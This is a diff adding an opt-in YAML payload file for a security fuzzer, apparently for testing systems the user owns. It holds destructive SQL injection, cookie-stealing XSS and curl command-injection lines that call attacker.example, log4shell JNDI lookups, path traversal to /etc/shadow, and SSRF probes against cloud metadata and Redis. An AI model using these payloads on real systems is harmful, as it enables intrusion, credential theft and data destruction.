@@ -1,0 +1,61 @@
+# Aggressive fuzzing payloads. Opt-in via:
+#   fuzzing.payloads_file: config/payloads-aggressive.yaml
+#
+# These payloads include destructive SQL, shell exec attempts, log4shell
+# (CVE-2021-44228) probes, and SSRF callbacks. Some of them WILL alter
+# state on a vulnerable backend (DROP, DELETE, file write). Use only
+# where you fully own the consequences.
+
+sql_injection:
+  - "' OR '1'='1"
+  - "'; DROP TABLE users; --"
+  - "'; DELETE FROM users WHERE 1=1; --"
+  - "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+  - "admin' OR 1=1--"
+  - "1; WAITFOR DELAY '0:0:5'--"
+  - "1' AND SLEEP(5)--"
+  - "1' OR pg_sleep(5)--"
+  - "1) OR 1=1--"
+  - "1' UNION SELECT @@version,NULL,NULL--"
+
+xss:
+  - "<script>alert(document.domain)</script>"
+  - "\"><svg/onload=alert(document.cookie)>"
+  - "<img src=x onerror=fetch('//attacker.example/?c='+document.cookie)>"
+  - "javascript:fetch('//attacker.example/?c='+document.cookie)"
+  - "</script><script>alert(1)</script>"
+
+path_traversal:
+  - "../../../../../../etc/passwd"
+  - "../../../../../../etc/shadow"
+  - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+  - "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+  - "/proc/self/environ"
+
+command_injection:
+  - "; id"
+  - "| whoami"
+  - "&& cat /etc/passwd"
+  - "; curl http://attacker.example/`whoami`"
+  - "$(curl http://attacker.example/$(whoami))"
+  - "`curl http://attacker.example/`whoami``"
+  - "; sleep 10"
+
+ssti:
+  - "{{7*7}}"
+  - "${7*7}"
+  - "<%= 7*7 %>"
+  - "{{config.items()}}"
+  - "${{<%[%'\"}}%\\."
+
+log4shell:
+  - "${jndi:ldap://attacker.example/exploit}"
+  - "${jndi:dns://attacker.example/exploit}"
+  - "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example/x}"
+
+ssrf:
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://localhost:6379/"
+  - "file:///etc/passwd"
+  - "gopher://localhost:6379/_FLUSHALL"
+  - "http://attacker.example/ssrf-callback"
